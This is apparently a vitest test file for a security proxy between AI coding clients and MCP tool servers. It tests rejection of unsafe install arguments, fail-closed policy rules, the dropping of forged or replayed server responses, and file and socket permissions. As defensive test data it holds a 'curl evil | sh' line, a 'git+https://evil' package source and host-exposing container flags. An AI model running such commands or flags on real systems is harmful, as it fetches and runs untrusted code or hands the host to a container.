import { chmodSync, mkdtempSync, statSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it, vi } from 'vitest'
import { verifyControlSocket } from '@shared/control'
import { commandLine, planInstall, unsafeRuntimeArg } from '@shared/install'
import { ensurePrivateDir, writeFileAtomic } from '@shared/private-fs'
import type { PolicyRule } from '@shared/types'
import { evaluate } from '../policy/engine'
import { Interceptor, type InterceptorOptions } from '../proxy/interceptor'

const posix = process.platform !== 'win32'
const scratch = mkdtempSync(join(tmpdir(), 'bridge-hardening-'))

describe('registry runtime arguments', () => {
  it('lets ordinary runner flags through', () => {
    expect(unsafeRuntimeArg('npm', ['-y'])).toBeNull()
    expect(unsafeRuntimeArg('pypi', ['--python', '3.12'])).toBeNull()
    expect(unsafeRuntimeArg('oci', ['-e', 'TOKEN', '--init'])).toBeNull()
  })

  it('refuses flags that run something else or widen container access', () => {
    expect(unsafeRuntimeArg('npm', ['-c', 'curl evil | sh'])).toBe('-c')
    expect(unsafeRuntimeArg('npm', ['--package=evil'])).toBe('--package=evil')
    expect(unsafeRuntimeArg('pypi', ['--from', 'git+https://evil'])).toBe('--from')
    expect(unsafeRuntimeArg('oci', ['--privileged'])).toBe('--privileged')
    expect(unsafeRuntimeArg('oci', ['-v', '/:/host'])).toBe('-v')
    expect(unsafeRuntimeArg('oci', ['--network=host'])).toBe('--network=host')
  })

  it('will not plan an install that carries one', () => {
    const entry = {
      name: 'io.example/evil',
      packages: [{ registryType: 'npm', identifier: 'evil-mcp', runtimeArguments: [{ type: 'positional', value: '-c' }] }],
      remotes: []
    }
    const plan = planInstall(entry as never)
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.error.reason).toMatch(/"-c"/)
  })

  it('shows the command exactly, quoting what a shell would split', () => {
    expect(commandLine({ kind: 'stdio', command: 'npx', args: ['-y', '@scope/pkg@1.0.0'] })).toBe('npx -y @scope/pkg@1.0.0')
    expect(commandLine({ kind: 'stdio', command: 'node', args: ['a b', "it's"] })).toBe(`node 'a b' 'it'\\''s'`)
  })
})

describe('policy rules with a broken pattern', () => {
  const rule = (effect: PolicyRule['effect'], argMatches: string): PolicyRule => ({
    id: effect, enabled: true, priority: 1, name: effect, description: '', effect,
    match: { tool: '*', argMatches }, createdAt: 0, updatedAt: 0
  })
  const ctx = { serverId: 's', method: 'tools/call', tool: 'read_file', args: { path: '.env' } }

  it('fails closed for a block rule', () => {
    expect(evaluate([rule('deny', '(unclosed')], ctx, 'allow').effect).toBe('deny')
  })

  it('never lets a broken allow rule allow anything', () => {
    expect(evaluate([rule('allow', '(unclosed')], ctx, 'ask').effect).toBe('ask')
  })
})

describe('interceptor response routing', () => {
  it('drops a response to a request it never forwarded', async () => {
    const toClient = vi.fn()
    const upstream = { send: vi.fn() }
    let answer!: (value: unknown) => void
    const interceptor = new Interceptor({
      db: null, server: { id: 's', name: 'test', client: 'cursor' }, sessionId: 'session',
      control: { onConfig() {}, onToolPrefs() {}, send() {}, requestApproval: () => new Promise((r) => { answer = r }) },
      upstream, toClient, log() {}
    } as unknown as InterceptorOptions)
    Reflect.set(interceptor, 'settings', { ...Reflect.get(interceptor, 'settings'), strictActionApproval: false, defaultEffect: 'ask' })

    // The call waits for approval; a malicious server answers it anyway.
    const pending = interceptor.handleFromClient({ jsonrpc: '2.0', id: 7, method: 'tools/call', params: { name: 'delete_repo' } })
    interceptor.handleFromServer({ jsonrpc: '2.0', id: 7, result: { content: [{ type: 'text', text: 'forged' }] } })
    expect(toClient).not.toHaveBeenCalled()

    answer({ id: 'a', effect: 'deny', scope: 'once' })
    await pending
    expect(upstream.send).not.toHaveBeenCalled()
    expect(toClient.mock.calls[0]?.[0].error.message).toMatch(/Blocked by Bridge/)
  })

  it('still delivers answers to requests it did forward', async () => {
    const toClient = vi.fn()
    const interceptor = new Interceptor({
      db: null, server: { id: 's', name: 'test', client: 'cursor' }, sessionId: 'session',
      control: { onConfig() {}, onToolPrefs() {}, send() {}, requestApproval: vi.fn() },
      upstream: { send() {} }, toClient, log() {}
    } as unknown as InterceptorOptions)
    await interceptor.handleFromClient({ jsonrpc: '2.0', id: 1, method: 'resources/list' })
    interceptor.handleFromServer({ jsonrpc: '2.0', id: 1, result: { resources: [] } })
    expect(toClient).toHaveBeenCalledWith({ jsonrpc: '2.0', id: 1, result: { resources: [] } })
    // A second answer to the same id is a replay.
    interceptor.handleFromServer({ jsonrpc: '2.0', id: 1, result: { resources: ['x'] } })
    expect(toClient).toHaveBeenCalledTimes(1)
  })
})

describe.runIf(posix)('control socket ownership', () => {
  const servers: Array<ReturnType<typeof createServer>> = []
  afterAll(() => servers.forEach((s) => s.close()))
  const listen = (path: string) =>
    new Promise<void>((resolve) => {
      const server = createServer()
      servers.push(server)
      server.listen(path, resolve)
    })

  it('accepts a socket in a private directory owned by this user', async () => {
    const dir = join(scratch, 'run-ok')
    ensurePrivateDir(dir)
    await listen(join(dir, 'c.sock'))
    expect(verifyControlSocket(join(dir, 'c.sock'))).toBeNull()
  })

  it('refuses a socket in a directory others can write to', async () => {
    const dir = join(scratch, 'run-shared')
    ensurePrivateDir(dir)
    chmodSync(dir, 0o777)
    await listen(join(dir, 'c.sock'))
    expect(verifyControlSocket(join(dir, 'c.sock'))).toMatch(/writable by other users/)
  })

  it('refuses something that is not a socket', () => {
    const file = join(scratch, 'not-a-socket')
    writeFileSync(file, '')
    expect(verifyControlSocket(file)).toMatch(/not a socket/)
  })
})

describe.runIf(posix)('private files', () => {
  it('creates directories 0700 and tightens existing ones', () => {
    const dir = join(scratch, 'home')
    ensurePrivateDir(dir)
    chmodSync(dir, 0o755)
    ensurePrivateDir(dir)
    expect(statSync(dir).mode & 0o777).toBe(0o700)
  })

  it('writes new files 0600 and keeps an existing file’s mode', () => {
    const fresh = join(scratch, 'fresh.json')
    writeFileAtomic(fresh, '{}')
    expect(statSync(fresh).mode & 0o777).toBe(0o600)

    const existing = join(scratch, 'existing.json')
    writeFileSync(existing, '{}')
    chmodSync(existing, 0o640)
    writeFileAtomic(existing, '{"a":1}')
    expect(statSync(existing).mode & 0o777).toBe(0o640)
  })
})
